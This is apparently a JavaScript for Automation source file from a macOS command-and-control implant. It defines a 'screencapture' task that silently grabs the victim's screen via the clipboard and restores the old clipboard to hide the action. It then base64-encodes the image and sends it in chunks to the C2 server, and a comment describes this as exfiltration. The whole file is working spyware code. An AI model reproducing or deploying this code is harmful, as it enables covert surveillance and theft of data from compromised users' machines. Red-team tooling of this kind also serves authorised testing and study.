exports.screencapture = function(task, command, params){
	//-c makes capture go to clipboard
	//-C to get cursor as well
	//-m only get main monitor
	//-t <format>
	//-T is delay from execution to occurance, default is 5
	//-x do not play sounds
	//-a do not capture attached windows
	//-b capture Touch Bar
	//if logged in via SSH:
	// [files] at the end to specify where to svae, 1 file per screen
	//	sudo launchctl bsexec {pid of loginwindow} screencapture [options]
	pieces = params.split(" ");
	//get a screencapture saved to clipboard and exfil that out over c2
	var command = "screencapture -c -C -T 0 -x -t png";
	if(pieces.length >= 1 && pieces[0] == "bar"){
		command = command + " -b"; //capture the bar instead of the main screen(s)
	}
	//since we're going to save to the clipboard, we want to save the current clipboard and restore it afterward
	var clipboard = currentApp.theClipboard(); //save the clipboardx
	currentApp.doShellScript(command); //get the screencapture
	var capture = currentApp.theClipboard()["PNGf"]; //get the data from the clipboard
	//put the old clipboard data back onto the clipboard
	currentApp.setTheClipboardTo(clipboard);
	var offset = 0;
    var chunkSize = 350000;
    //var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
    // Get the file size by seeking;
    var fileSize = parseInt(capture.length);//handle.seekToEndOfFile;
    // always round up to account for chunks that are < chunksize;
    var numOfChunks = Math.ceil(fileSize / chunkSize);
    var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
    var registerData = convert_to_nsdata(registerData);
    var registerFile = C2.postResponse(task, registerData);
    if (registerFile['status'] == "success"){
        var currentChunk = 1;
        var data = capture.substring(offset, chunkSize);//handle.readDataOfLength(chunkSize);
        data = convert_to_nsdata(data);
        while(parseInt(data.length) > 0 && offset < fileSize){
            // send a chunk
            var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
            fileData = convert_to_nsdata(fileData);
            C2.postResponse(task, fileData);
            $.NSThread.sleepForTimeInterval(C2.getInterval());

            // increment the offset and seek to the amount of data read from the file
            offset = offset + parseInt(data.length);
            //handle.seekToFileOffset(offset);
            currentChunk += 1;
            var data = capture.substring(offset, chunkSize + offset);//data = handle.readDataOfLength(chunkSize);
            data = convert_to_nsdata(data);
        }
        var output = "Finished downloading file with id: " + registerFile['file_id'];
        output += "\\nBrowse to /api/v1.0/files/" + registerFile['file_id'] + " and base64 decode it";
    }
    else{
       var output = "Failed to register file to download";
    }
    return output;
};